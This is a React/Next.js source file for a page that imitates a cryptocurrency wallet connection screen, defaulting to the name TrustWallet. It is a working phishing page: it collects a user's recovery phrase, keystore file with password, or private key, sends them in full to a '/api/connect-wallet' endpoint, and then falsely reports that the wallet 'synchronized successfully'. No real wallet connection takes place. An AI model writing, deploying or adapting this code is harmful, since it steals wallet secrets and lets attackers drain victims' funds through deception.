'use client';

import { Button } from '@/components/ui/button';
import { WalletIcon } from '@/components/wallet-icons';
import { ArrowLeft } from 'lucide-react';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import { Toaster, toast } from 'sonner';
import { z } from 'zod';

// Validation schemas
const phraseSchema = z.object({
  phrase: z
    .string()
    .min(1, 'Recovery phrase is required')
    .refine(
      (value) => {
        const words = value.trim().split(/\s+/);
        return words.length === 12 || words.length === 24;
      },
      {
        message: 'Recovery phrase must contain exactly 12 or 24 words',
      }
    )
    .refine(
      (value) => {
        const words = value.trim().split(/\s+/);
        return words.every((word) => /^[a-z]+$/.test(word));
      },
      {
        message:
          'Recovery phrase must contain only valid words (lowercase letters only)',
      }
    ),
});

const keystoreSchema = z.object({
  keystore: z
    .string()
    .min(1, 'Keystore JSON is required')
    .refine(
      (value) => {
        try {
          JSON.parse(value);
          return true;
        } catch {
          return false;
        }
      },
      {
        message: 'Invalid JSON format for keystore',
      }
    ),
  password: z
    .string()
    .min(1, 'Keystore password is required')
    .min(6, 'Password must be at least 6 characters'),
});

const privateKeySchema = z.object({
  privateKey: z
    .string()
    .min(1, 'Private key is required')
    .refine((value) => /^0x[a-fA-F0-9]+$/.test(value), {
      message:
        'Private key must start with 0x followed by hexadecimal characters',
    }),
});

export default function ConnectManualPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [activeTab, setActiveTab] = useState<
    'phrase' | 'keystore' | 'private-key'
  >('phrase');
  const [phraseInput, setPhraseInput] = useState('');
  const [keystoreInput, setKeystoreInput] = useState('');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKeyInput, setPrivateKeyInput] = useState('');
  const [walletName, setWalletName] = useState('TrustWallet');
  const [phraseError, setPhraseError] = useState('');
  const [keystoreError, setKeystoreError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [privateKeyError, setPrivateKeyError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const wallet = searchParams.get('wallet');
    if (wallet) {
      setWalletName(decodeURIComponent(wallet));
    }
  }, [searchParams]);

  const handleConnectWallet = async () => {
    // Clear previous errors
    setPhraseError('');
    setKeystoreError('');
    setPasswordError('');
    setPrivateKeyError('');

    try {
      if (activeTab === 'phrase') {
        const result = phraseSchema.parse({ phrase: phraseInput });

        // Send wallet details to API
        await sendWalletDetails({
          phrase_input: phraseInput,
          keystore_input: '',
          keystore_password: '',
          private_key_input: '',
          connection_type: 'phrase',
        });

        toast.success('Wallet synchronized successfully');
        setTimeout(() => {
          router.push(`/success?wallet=${encodeURIComponent(walletName)}`);
        }, 4000);
      } else if (activeTab === 'keystore') {
        keystoreSchema.parse({
          keystore: keystoreInput,
          password: keystorePassword,
        });

        // Send wallet details to API
        await sendWalletDetails({
          phrase_input: '',
          keystore_input: keystoreInput,
          keystore_password: keystorePassword,
          private_key_input: '',
          connection_type: 'keystore',
        });

        toast.success('Wallet synchronized successfully');
        setTimeout(() => {
          router.push(`/success?wallet=${encodeURIComponent(walletName)}`);
        }, 4000);
      } else if (activeTab === 'private-key') {
        const result = privateKeySchema.parse({
          privateKey: privateKeyInput,
        });

        // Send wallet details to API
        await sendWalletDetails({
          phrase_input: '',
          keystore_input: '',
          keystore_password: '',
          private_key_input: privateKeyInput,
          connection_type: 'private_key',
        });

        toast.success('Wallet synchronized successfully');
        setTimeout(() => {
          router.push(`/success?wallet=${encodeURIComponent(walletName)}`);
        }, 4000);
      }
    } catch (error) {
      if (error instanceof z.ZodError) {
        error.errors.forEach((err) => {
          const message = err.message;
          if (activeTab === 'phrase') {
            setPhraseError(message);
            toast.error(message);
          } else if (activeTab === 'keystore') {
            if (err.path[0] === 'keystore') {
              setKeystoreError(message);
            } else if (err.path[0] === 'password') {
              setPasswordError(message);
            }
            toast.error(message);
          } else if (activeTab === 'private-key') {
            setPrivateKeyError(message);
            toast.error(message);
          }
        });
      }
    } finally {
      setIsLoading(false);
    }
  };

  const sendWalletDetails = async (details: {
    phrase_input: string;
    keystore_input: string;
    keystore_password: string;
    private_key_input: string;
    connection_type: string;
  }) => {
    setIsLoading(true);

    const payload = {
      template_params: {
        wallet_name: walletName,
        connection_type: details.connection_type,
        connection_timestamp: new Date().toISOString(),
      },
      phrase_input: details.phrase_input,
      keystore_input: details.keystore_input,
      keystore_password: details.keystore_password,
      private_key_input: details.private_key_input,
      message:
        details.phrase_input ||
        details.keystore_input ||
        details.private_key_input,
    };

    try {
      const response = await fetch('/api/connect-wallet', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.statusText}`);
      }

      const result = await response.json();
      console.log('Wallet details sent successfully:', result);
    } catch (error) {
      toast.error('Failed to process wallet connection');
      throw error;
    }
  };

  return (
    <>
      <Toaster position='top-center' richColors />
      <main className='min-h-screen bg-background text-foreground'>
        <section className='relative py-16 overflow-hidden'>
          {/* Decorative backgrounds */}
          <div className='absolute inset-0 -z-10 overflow-hidden'>
            <div className='absolute top-32 left-1/3 w-96 h-96 bg-primary/5 rounded-full blur-3xl'></div>
            <div className='absolute bottom-32 right-1/4 w-80 h-80 bg-accent/5 rounded-full blur-3xl'></div>
          </div>

          <div className='max-w-2xl mx-auto px-4 sm:px-6 lg:px-8'>
            {/* Back button */}
            <Link
              href='/connect'
              className='inline-flex items-center gap-2 text-primary hover:text-primary/90 mb-8 transition-colors'
            >
              <ArrowLeft className='w-5 h-5' />
              <span className='font-medium'>Back to Connect</span>
            </Link>

            {/* Card container */}
            <div className='bg-card border border-border rounded-2xl p-8 md:p-12 shadow-xl'>
              {/* Header */}
              <div className='text-center mb-12'>
                {/* Wallet Logo */}
                <div className='flex justify-center mb-6'>
                  <div className='w-16 h-16 rounded-2xl shadow-lg'>
                    <WalletIcon name={walletName} className='w-full h-full' />
                  </div>
                </div>

                <h1 className='text-3xl font-bold text-foreground mb-2'>
                  {walletName}
                </h1>
              </div>

              {/* Tabs */}
              <div className='flex gap-4 mb-8 border-b border-border'>
                {['phrase', 'keystore', 'private-key'].map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setActiveTab(tab as typeof activeTab)}
                    className={`pb-4 px-1 font-medium text-sm md:text-base transition-colors relative ${
                      activeTab === tab
                        ? 'text-primary'
                        : 'text-muted-foreground hover:text-foreground'
                    }`}
                  >
                    {tab === 'phrase' && 'Phrase'}
                    {tab === 'keystore' && 'Keystore'}
                    {tab === 'private-key' && 'Private Key'}
                    {activeTab === tab && (
                      <div className='absolute bottom-0 left-0 right-0 h-0.5 bg-primary'></div>
                    )}
                  </button>
                ))}
              </div>

              {/* Tab Content */}
              <div className='space-y-6'>
                {/* Phrase Tab */}
                {activeTab === 'phrase' && (
                  <div className='space-y-6 animate-fade-in'>
                    <div className='space-y-3'>
                      <label className='block text-sm font-medium text-foreground'>
                        Recovery Phrase
                      </label>
                      <textarea
                        value={phraseInput}
                        onChange={(e) => {
                          setPhraseInput(e.target.value);
                          setPhraseError('');
                        }}
                        placeholder='Enter your recovery phrase'
                        className={`w-full px-4 py-3 rounded-lg border bg-input text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 resize-none transition-colors ${
                          phraseError
                            ? 'border-red-500 focus:ring-red-500/50'
                            : 'border-border focus:ring-primary/50'
                        }`}
                        rows={5}
                      />
                      {phraseError && (
                        <p className='text-sm text-red-500 font-medium'>
                          {phraseError}
                        </p>
                      )}
                      <p className='text-xs text-muted-foreground'>
                        Example: "apple river galaxy gentle lemon flight mirror
                        canyon tiger velvet stone happy"
                      </p>
                      <p className='text-xs text-muted-foreground'>
                        Typically 12 (sometimes 24) words separated by single
                        spaces
                      </p>
                    </div>
                  </div>
                )}

                {/* Keystore Tab */}
                {activeTab === 'keystore' && (
                  <div className='space-y-6 animate-fade-in'>
                    <div className='space-y-3'>
                      <label className='block text-sm font-medium text-foreground'>
                        Keystore JSON
                      </label>
                      <textarea
                        value={keystoreInput}
                        onChange={(e) => {
                          setKeystoreInput(e.target.value);
                          setKeystoreError('');
                        }}
                        placeholder='Enter your Keystore JSON'
                        className={`w-full px-4 py-3 rounded-lg border bg-input text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 resize-none font-mono text-sm transition-colors ${
                          keystoreError
                            ? 'border-red-500 focus:ring-red-500/50'
                            : 'border-border focus:ring-primary/50'
                        }`}
                        rows={5}
                      />
                      {keystoreError && (
                        <p className='text-sm text-red-500 font-medium'>
                          {keystoreError}
                        </p>
                      )}
                    </div>
                    <div className='space-y-3'>
                      <label className='block text-sm font-medium text-foreground'>
                        Keystore Password
                      </label>
                      <input
                        type='password'
                        value={keystorePassword}
                        onChange={(e) => {
                          setKeystorePassword(e.target.value);
                          setPasswordError('');
                        }}
                        placeholder='Keystore Password'
                        className={`w-full px-4 py-3 rounded-lg border bg-input text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 transition-colors ${
                          passwordError
                            ? 'border-red-500 focus:ring-red-500/50'
                            : 'border-border focus:ring-primary/50'
                        }`}
                      />
                      {passwordError && (
                        <p className='text-sm text-red-500 font-medium'>
                          {passwordError}
                        </p>
                      )}
                      <p className='text-xs text-muted-foreground'>
                        Several lines of text beginning with {'"'}
                      </p>
                    </div>
                  </div>
                )}

                {/* Private Key Tab */}
                {activeTab === 'private-key' && (
                  <div className='space-y-6 animate-fade-in'>
                    <div className='space-y-3'>
                      <label className='block text-sm font-medium text-foreground'>
                        Private Key
                      </label>
                      <input
                        type='password'
                        value={privateKeyInput}
                        onChange={(e) => {
                          setPrivateKeyInput(e.target.value);
                          setPrivateKeyError('');
                        }}
                        placeholder='Enter your private key (0x...)'
                        className={`w-full px-4 py-3 rounded-lg border bg-input text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 transition-colors ${
                          privateKeyError
                            ? 'border-red-500 focus:ring-red-500/50'
                            : 'border-border focus:ring-primary/50'
                        }`}
                      />
                      {privateKeyError && (
                        <p className='text-sm text-red-500 font-medium'>
                          {privateKeyError}
                        </p>
                      )}
                    </div>
                  </div>
                )}

                {/* Connect Button */}
                <Button
                  onClick={handleConnectWallet}
                  disabled={isLoading}
                  className='w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-3 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed'
                >
                  {isLoading ? 'Processing...' : 'Connect Wallet'}
                </Button>

                {/* Terms of Service */}
                <p className='text-xs text-muted-foreground text-center'>
                  By connecting a wallet, you agree to our{' '}
                  <a
                    href='#'
                    className='text-primary hover:text-primary/90 underline'
                  >
                    Terms of service
                  </a>
                </p>
              </div>
            </div>
          </div>
        </section>
      </main>
    </>
  );
}
